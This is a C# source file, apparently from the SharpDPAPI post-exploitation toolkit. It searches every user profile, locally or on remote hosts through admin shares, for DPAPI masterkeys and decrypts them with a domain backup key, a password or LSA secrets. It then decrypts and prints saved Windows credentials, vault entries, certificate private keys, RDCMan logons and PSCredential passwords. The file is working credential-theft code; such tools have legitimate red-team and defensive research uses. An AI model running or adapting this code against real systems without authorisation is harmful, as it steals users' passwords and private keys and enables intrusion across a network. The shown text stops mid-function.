using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;

namespace SharpDPAPI
{
    public class Triage
    {
        public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes, bool show = false, string computerName = "", string password = "")
        {
            // triage all *user* masterkeys we can find, decrypting if the backupkey is supplied

            Dictionary<string, string> mappings = new Dictionary<string, string>();
            bool canAccess = false;

            if (!String.IsNullOrEmpty(computerName))
            {
                canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return new Dictionary<string, string>();
                }
            }

            string[] userDirs;

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && canAccess))
            {
                // if elevated, triage ALL reachable masterkeys

                string userFolder = "";

                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                userDirs = Directory.GetDirectories(userFolder);
            }
            else
            {
                // otherwise we're only triaging the current user's path
                userDirs = new string[] { System.Environment.GetEnvironmentVariable("USERPROFILE") };
            }

            foreach (string dir in userDirs)
            {
                string[] parts = dir.Split('\\');
                string userName = parts[parts.Length - 1];
                if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                {
                    string userDPAPIBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Protect\\", dir);
                    if (System.IO.Directory.Exists(userDPAPIBasePath))
                    {
                        string[] directories = Directory.GetDirectories(userDPAPIBasePath);
                        foreach (string directory in directories)
                        {
                            string[] files = Directory.GetFiles(directory);
                            bool isDomain = false;
                            byte[] hmacbytes = null;

                            foreach (string file in files)
                            {
                                // if the BK-<NETBIOSDOMAINNAME> file exists, assume this is a domain user.
                                if (Regex.IsMatch(file, @".*\\BK-[0-9A-Za-z]+"))
                                {
                                    isDomain = true; // means use the NTLM of the user password instead of the SHA1
                                }
                            }

                            if (!String.IsNullOrEmpty(password))
                            {
                                hmacbytes = Dpapi.CalculateKeys(password, directory, isDomain);
                            }

                            foreach (string file in files)
                            {
                                if (Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                {
                                    string fileName = System.IO.Path.GetFileName(file);
                                    if (show)
                                    {
                                        Console.WriteLine("[*] Found MasterKey : {0}", file);
                                    }

                                    byte[] masteyKeyBytes = File.ReadAllBytes(file);
                                    try
                                    {
                                        if(!String.IsNullOrEmpty(password))
                                        {
                                            Dictionary<string, string> mapping = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, hmacbytes);
                                            mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
                                        }
                                        else
                                        {
                                            Dictionary<string, string> mapping = Dpapi.DecryptMasterKey(masteyKeyBytes, backupKeyBytes);
                                            mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
                                        }
                                    }
                                    catch (Exception e)
                                    {
                                        Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if (!String.IsNullOrEmpty(password))
            {
                if (mappings.Count == 0)
                {
                    Console.WriteLine("\n[!] No master keys decrypted!\r\n");
                }
                else
                {
                    Console.WriteLine("\n[*] User master key cache:\r\n");
                    foreach (KeyValuePair<string, string> kvp in mappings)
                    {
                        Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                    }
                    Console.WriteLine();
                }
            }

            Console.WriteLine();
            return mappings;
        }

        public static Dictionary<string, string> TriageSystemMasterKeys(bool show = false)
        {
            // retrieve the DPAPI_SYSTEM key and use it to decrypt any SYSTEM DPAPI masterkeys

            Dictionary<string, string> mappings = new Dictionary<string, string>();

            if (Helpers.IsHighIntegrity())
            {
                // get the system and user DPAPI backup keys, showing the machine DPAPI keys
                //  { machine , user }

                List<byte[]> keys = LSADump.GetDPAPIKeys(true);
                Helpers.GetSystem();
                string systemFolder = String.Format("{0}\\Windows\\System32\\Microsoft\\Protect\\", Environment.GetEnvironmentVariable("SystemDrive"));

                string[] systemDirs = Directory.GetDirectories(systemFolder);

                foreach (string directory in systemDirs)
                {
                    string[] machineFiles = Directory.GetFiles(directory);
                    string[] userFiles = new string[0];

                    if (Directory.Exists(String.Format("{0}\\User\\", directory)))
                    {
                        userFiles = Directory.GetFiles(String.Format("{0}\\User\\", directory));
                    }

                    foreach (string file in machineFiles)
                    {
                        if (Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")) //Changed regex to only match files starting with the id
                        {
                            string fileName = System.IO.Path.GetFileName(file);
                            if (show)
                            {
                                Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
                            }

                            byte[] masteyKeyBytes = File.ReadAllBytes(file);
                            try
                            {
                                // use the "machine" DPAPI key
                                Dictionary<string, string> mapping = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
                                mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                            }
                        }
                    }

                    foreach (string file in userFiles)
                    {
                        if (Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            string fileName = System.IO.Path.GetFileName(file);
                            if (show)
                            {
                                Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
                            }

                            byte[] masteyKeyBytes = File.ReadAllBytes(file);
                            try
                            {
                                // use the "user" DPAPI key
                                Dictionary<string, string> mapping = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
                                mapping.ToList().ForEach(x => mappings.Add(x.Key, x.Value));
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM masterkeys!\r\n");
            }

            return mappings;
        }

        public static void TriageUserCreds(Dictionary<string, string> MasterKeys, string computerName = "")
        {
            // triage all *user* Credential files we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Credentials for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    string[] parts = dir.Split('\\');
                    string userName = parts[parts.Length - 1];
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", dir);
                        TriageCredFolder(userCredFilePath, MasterKeys);
                        string userCredFilePath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", dir);
                        TriageCredFolder(userCredFilePath2, MasterKeys);
                    }
                }
            }
            else
            {
                // otherwise just triage the current user's credential folder
                Console.WriteLine("[*] Triaging Credentials for current user\r\n");
                string userCredFilePath = String.Format("{0}\\AppData\\Local\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                TriageCredFolder(userCredFilePath, MasterKeys);
                string userCredFilePath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Credentials\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                TriageCredFolder(userCredFilePath2, MasterKeys);
            }
        }

        public static void TriageUserVaults(Dictionary<string, string> MasterKeys, string computerName = "")
        {
            // triage all *user* vaults we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Vaults for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    string[] parts = dir.Split('\\');
                    string userName = parts[parts.Length - 1];
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string[] folderLocations =
                        {
                            String.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", dir),
                            String.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", dir)
                        };

                        foreach (string location in folderLocations)
                        {
                            if (Directory.Exists(location))
                            {
                                string[] vaultDirs = Directory.GetDirectories(location);
                                foreach (string vaultDir in vaultDirs)
                                {
                                    if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                    {
                                        TriageVaultFolder(vaultDir, MasterKeys);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("[*] Triaging Vaults for the current user\r\n");

                string vaultPath = String.Format("{0}\\AppData\\Local\\Microsoft\\Vault\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (Directory.Exists(vaultPath))
                {
                    string[] vaultDirs = Directory.GetDirectories(vaultPath);
                    foreach (string vaultDir in vaultDirs)
                    {
                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            TriageVaultFolder(vaultDir, MasterKeys);
                        }
                    }
                }

                string vaultPath2 = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Vault\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (Directory.Exists(vaultPath2))
                {
                    string[] vaultDirs = Directory.GetDirectories(vaultPath2);
                    foreach (string vaultDir in vaultDirs)
                    {
                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            TriageVaultFolder(vaultDir, MasterKeys);
                        }
                    }
                }
            }
        }

        public static void TriageSystemCreds(Dictionary<string, string> MasterKeys)
        {
            // triage all *SYSTEM* cred files we can reach

            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[*] Triaging System Credentials\r\n");

                // all the SYSTEM Credential file locations
                string[] folderLocations =
                {
                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials", Environment.GetEnvironmentVariable("SystemRoot"))
                };

                foreach (string location in folderLocations)
                {
                    TriageCredFolder(location, MasterKeys);
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM credentials!\r\n");
            }
        }

        public static void TriageSystemVaults(Dictionary<string, string> MasterKeys)
        {
            // triage all *SYSTEM* vaults we can reach

            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[*] Triaging SYSTEM Vaults\r\n");

                string[] folderLocations =
                {
                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot")),
                    String.Format("{0}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault", Environment.GetEnvironmentVariable("SystemRoot"))
                };

                foreach (string location in folderLocations)
                {
                    if (Directory.Exists(location))
                    {
                        string[] vaultDirs = Directory.GetDirectories(location);
                        foreach (string vaultDir in vaultDirs)
                        {
                            if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                            {
                                TriageVaultFolder(vaultDir, MasterKeys);
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM vaults!\r\n");
            }
        }

        public static void TriageVaultFolder(string folder, Dictionary<string, string> MasterKeys)
        {
            // takes a Vault folder, extracts the AES 128/256 keys from Policy.vpol, and uses these
            //  to decrypt any .vcrd vault credentials

            string policyFilePath = String.Format("{0}\\Policy.vpol", folder);
            if (File.Exists(policyFilePath))
            {
                Console.WriteLine("\r\n[*] Triaging Vault folder: {0}", folder);

                byte[] policyBytes = File.ReadAllBytes(policyFilePath);

                // first try to get vault keys from the Policy.vpol
                ArrayList keys = Dpapi.DescribePolicy(policyBytes, MasterKeys);

                if (keys.Count > 0)
                {
                    // make sure we have keys returned

                    string[] vaultCredFiles = Directory.GetFiles(folder);
                    if ((vaultCredFiles != null) && (vaultCredFiles.Length != 0))
                    {
                        foreach (string vaultCredFile in vaultCredFiles)
                        {
                            string fileName = System.IO.Path.GetFileName(vaultCredFile);
                            if (fileName.EndsWith("vcrd"))
                            {
                                byte[] vaultCredBytes = File.ReadAllBytes(vaultCredFile);

                                try
                                {
                                    // describe the vault credential file using the Policy credentials
                                    Dpapi.DescribeVaultCred(vaultCredBytes, keys);
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[X] Error triaging {0} : {1}", vaultCredFile, e.Message);
                                }
                            }
                        }
                    }
                }
            }
        }

        public static void TriageCredFolder(string folder, Dictionary<string, string> MasterKeys)
        {
            // triage a specific credential folder

            if (System.IO.Directory.Exists(folder))
            {
                string[] systemFiles = Directory.GetFiles(folder);
                if ((systemFiles != null) && (systemFiles.Length != 0))
                {
                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);

                    foreach (string file in systemFiles)
                    {
                        try
                        {
                            TriageCredFile(file, MasterKeys);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                        }
                    }
                }
                else
                {
                    // Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
                }
            }
            else
            {
                // Console.WriteLine("\r\n[X] Folder '{0}' doesn't currently exist!", folder);
            }
        }

        public static void TriageCredFile(string credFilePath, Dictionary<string, string> MasterKeys)
        {
            // triage a specific credential file

            string fileName = System.IO.Path.GetFileName(credFilePath);
            Console.WriteLine("  CredFile           : {0}\r\n", fileName);
            byte[] credentialArray = File.ReadAllBytes(credFilePath);

            // describe and possibly parse the credential blob
            try
            {
                Dpapi.DescribeCredential(credentialArray, MasterKeys);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Error triaging {0} : {1}", credFilePath, e.Message);
            }
            Console.WriteLine();
        }

        public static void TriageCertFile(string certFilePath, Dictionary<string, string> MasterKeys)
        {
            // triage a certificate file
            try
            {
                Dictionary<string, Tuple<string, string>> certDictionary = new Dictionary<string, Tuple<string, string>>();
                string fileName = System.IO.Path.GetFileName(certFilePath);
                Console.WriteLine("  Certificate file           : {0}\r\n", fileName);

                byte[] certificateArray = File.ReadAllBytes(certFilePath);
                try
                {
                    certDictionary.Add(fileName, Dpapi.DescribeCertificate(certificateArray, MasterKeys));
                }
                catch (Exception e)
                {
                    Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
                }
                Console.WriteLine();
                foreach (var key in certDictionary.Keys)
                {
                    Console.WriteLine("{0}", certDictionary[key]);
                    Console.WriteLine();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Error triaging {0} : {1}", certFilePath, e.Message);
            }

            Console.WriteLine();
        }

        public static void TriageCertFolder(string folder, Dictionary<string, string> MasterKeys, bool machine = false)
        {
            // triage a specific certificate folder
            Dictionary<string, Tuple<string, string>> certDictionary = new Dictionary<string, Tuple<string, string>>();
            if (System.IO.Directory.Exists(folder))
            {
                string[] systemFiles = Directory.GetFiles(folder);
                if ((systemFiles != null) && (systemFiles.Length != 0))
                {
                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);

                    foreach (string file in systemFiles)
                    {
                        if (Regex.IsMatch(file,
                            @"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")
                        )
                        {
                            string fileName = System.IO.Path.GetFileName(file);
                            Console.WriteLine("\r\nCertificate file           : {0}\r\n", fileName);
                            byte[] certificateArray = File.ReadAllBytes(file);
                            try
                            {
                                certDictionary.Add(fileName, Dpapi.DescribeCertificate(certificateArray, MasterKeys,machine));
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
                }

                Console.WriteLine();

                foreach (var key in certDictionary.Keys)
                {
                    if (certDictionary[key].First != "")
                    {
                        Console.WriteLine("[*] Private key file {0} was recovered\r\n", key);
                        Console.WriteLine("[*] PKCS1 Private key\r\n");
                        Console.WriteLine(certDictionary[key].First);
                        Console.WriteLine("\r\n[*] Certificate\r\n");
                        Console.WriteLine(certDictionary[key].Second);
                        Console.WriteLine();
                    }
                }
            }
        }

        public static void TriageSystemCerts(Dictionary<string, string> MasterKeys)
        {

            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[*] Triaging System Certificates\r\n");

                // all the SYSTEM Credential file locations
                string[] folderLocations =
                {
                    String.Format("{0}\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys", Environment.GetEnvironmentVariable("SystemDrive")),
                    String.Format("{0}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA", Environment.GetEnvironmentVariable("SystemDrive")),
                    String.Format("{0}\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys", Environment.GetEnvironmentVariable("SystemDrive"))
                };

                foreach (string location in folderLocations)
                {
                    TriageCertFolder(location, MasterKeys,true);
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM credentials!\r\n");
            }

        }

        public static void TriageUserCerts(Dictionary<string, string> MasterKeys, string computerName = "")
        {

            string[] userDirs;
            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            //TODO have not verified with multiple users
            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                string userFolder = "";

                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                userDirs = Directory.GetDirectories(userFolder);
            }
            else
            {
                // otherwise we're only triaging the current user's path
                userDirs = new string[] { System.Environment.GetEnvironmentVariable("USERPROFILE") };
            }

            foreach (string dir in userDirs)
            {
                string[] parts = dir.Split('\\');
                string userName = parts[parts.Length - 1];
                if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") ||
                      dir.EndsWith("All Users")))
                {
                    string userCertkeysBasePath = String.Format("{0}\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\", dir);
                   
                    if (System.IO.Directory.Exists(userCertkeysBasePath))
                    {
                        Dictionary<string, Tuple<string, string>> certDictionary = new Dictionary<string, Tuple<string, string>>();
                        string[] directories = Directory.GetDirectories(userCertkeysBasePath);
                        
                            foreach (string directory in directories)
                            {
                                string[] files = Directory.GetFiles(directory);

                                foreach (string file in files)
                                {
                                    if (Regex.IsMatch(file,@"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                    {
                                        string fileName = System.IO.Path.GetFileName(file);
                                        Console.WriteLine("\r\nCertificate file           : {0}\r\n", fileName);
                                        byte[] certificateArray = File.ReadAllBytes(file);
                                        try
                                        {
                                            certDictionary.Add(fileName,Dpapi.DescribeCertificate(certificateArray, MasterKeys)); 
                                        }
                                        catch (Exception e)
                                        {
                                            Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
                                        }
                                    }
                                }
                        }
                        Console.WriteLine();

                        foreach (var key in certDictionary.Keys)
                        {
                            if (certDictionary[key].First != "")
                            {
                                Console.WriteLine("[*] Private key file {0} was recovered\r\n", key);
                                Console.WriteLine("[*] PKCS1 Private key\r\n");
                                Console.WriteLine(certDictionary[key].First);
                                Console.WriteLine("\r\n[*] Certificate\r\n");
                                Console.WriteLine(certDictionary[key].Second);
                                Console.WriteLine();
                            }
                        }
                        Console.WriteLine("[*] Hint: openssl pkcs12 -export -inkey key.pem -in cert.cer -out cert.p12");
                    }
                }
            }
        }
        public static void TriageRDCMan(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false)
        {
            // search for RDCMan.settings files, parsing any found with TriageRDCManFile()

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging RDCMan.settings Files for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    string[] parts = dir.Split('\\');
                    string userName = parts[parts.Length - 1];
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", dir);
                        TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
                    }
                }
            }
            else
            {
                Console.WriteLine("[*] Triaging RDCMan Settings Files for current user\r\n");
                string userName = Environment.GetEnvironmentVariable("USERNAME");
                string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
            }
        }

        public static void TriagePSCredFile(Dictionary<string, string> MasterKeys, string credFile, bool unprotect = false)
        {
            // triage a saved PSCredential .xml
            //  example - `Get-Credential | Export-Clixml -Path C:\Temp\cred.xml`

            if (System.IO.File.Exists(credFile))
            {
                DateTime lastAccessed = System.IO.File.GetLastAccessTime(credFile);
                DateTime lastModified = System.IO.File.GetLastWriteTime(credFile);

                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(credFile);

                Console.WriteLine("    CredFile         : {0}", credFile);
                Console.WriteLine("    Accessed         : {0}", lastAccessed);
                Console.WriteLine("    Modified         : {0}", lastModified);

                XmlNodeList props = xmlDoc.GetElementsByTagName("Props");
                if (props.Count > 0)
                {
                    string userName = props[0].ChildNodes[0].InnerText;
                    string dpapiBlob = props[0].ChildNodes[1].InnerText;

                    Console.WriteLine("    User Name        : {0}", userName);

                    byte[] blobBytes = Helpers.StringToByteArray(dpapiBlob);

                    if (blobBytes.Length > 0)
                    {
                        byte[] decBytesRaw = Dpapi.DescribeDPAPIBlob(blobBytes, MasterKeys, "blob", unprotect);

                        if ((decBytesRaw != null) && (decBytesRaw.Length != 0))
                        {
                            string password = "";
                            int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
                            if (finalIndex > 1)
                            {
                                byte[] decBytes = new byte[finalIndex + 1];
                                Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                                password = Encoding.Unicode.GetString(decBytes);
                            }
                            else
                            {
                                password = Encoding.ASCII.GetString(decBytesRaw);
                            }
                            Console.WriteLine("    Password         : {0}", password);
                        }
                    }
                }
                Console.WriteLine();
            }
            else
            {
                Console.WriteLine("\r[X]  PSCredential .xml file '{0}' is not accessible or doesn't exist!\n", credFile);
            }
        }

        public static void TriageRDCManFile(Dictionary<string, string> MasterKeys, string rdcManFile, bool unprotect = false)
        {
            // triage a specific RDCMan.settings file

            if (System.IO.File.Exists(rdcManFile))
            {
                DateTime lastAccessed = System.IO.File.GetLastAccessTime(rdcManFile);
                DateTime lastModified = System.IO.File.GetLastWriteTime(rdcManFile);

                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(rdcManFile);

                Console.WriteLine("    RDCManFile    : {0}", rdcManFile);
                Console.WriteLine("    Accessed      : {0}", lastAccessed);
                Console.WriteLine("    Modified      : {0}", lastModified);


                // show any recently used servers
                XmlNodeList recentlyUsed = xmlDoc.GetElementsByTagName("recentlyUsed");
                if (recentlyUsed[0]["server"] != null)
                {
                    string recentlyUsedServer = recentlyUsed[0]["server"].InnerText;
                    Console.WriteLine("    Recent Server : {0}", recentlyUsedServer);
                }


                // see if there are any credential profiles
                XmlNodeList credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");

                if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
                {
                    Console.WriteLine("\r\n        Cred Profiles");
                }
                foreach (XmlNode credProfileNode in credProfileNodes)
                {
                    Console.WriteLine();
                    DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
                }


                // check default logonCredentials stuff
                XmlNodeList logonCredNodes = xmlDoc.GetElementsByTagName("logonCredentials");

                if ((logonCredNodes != null) && (logonCredNodes.Count != 0))
                {
                    Console.WriteLine("\r\n        Default Logon Credentials");
                }
                foreach (XmlNode logonCredNode in logonCredNodes)
                {
                    Console.WriteLine();
                    DisplayCredProfile(MasterKeys, logonCredNode, unprotect);
                }


                // grab the recent RDG files
                XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
                XmlNodeList items = filesToOpen[0].ChildNodes;

                // triage recently used RDG files                
                foreach (XmlNode rdgFile in items)
                {
                    if (Interop.PathIsUNC(rdcManFile))
                    {
                        // If the RDCMan.settings file is a \\UNC path (so /server:X was used),
                        //  check if the .RDG file is local or also a \\UNC path.
                        if (!Interop.PathIsUNC(rdgFile.InnerText))
                        {
                            // If the file .RDG file is local, try to translate it to the server \\UNC path
                            string computerName = rdcManFile.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
                            string rdgUncPath = Helpers.ConvertLocalPathToUNCPath(computerName, rdgFile.InnerText);
                            TriageRDGFile(MasterKeys, rdgUncPath, unprotect);
                        }
                        else
                        {
                            TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
                        }
                    }
                    else
                    {
                        TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
                    }
                }
                Console.WriteLine();
            }
            else
            {
                // Console.WriteLine("\r\n      [X] RDCMan.settings file '{0}' is not accessible or doesn't exist!", rdcManFile);
            }
        }

        public static void DisplayCredProfile(Dictionary<string, string> MasterKeys, XmlNode credProfileNode, bool unprotect = false)
        {
            // helper that displays a Credential Profile/Logon settings XML node from RDG/RDCMan.settings files

            string profileName = credProfileNode["profileName"].InnerText;

            if (credProfileNode["userName"] == null)
            {
                // have a profile name only
                Console.WriteLine("          Cred Profile : {0}", profileName);
            }
            else
            {
                string userName = credProfileNode["userName"].InnerText.Trim();
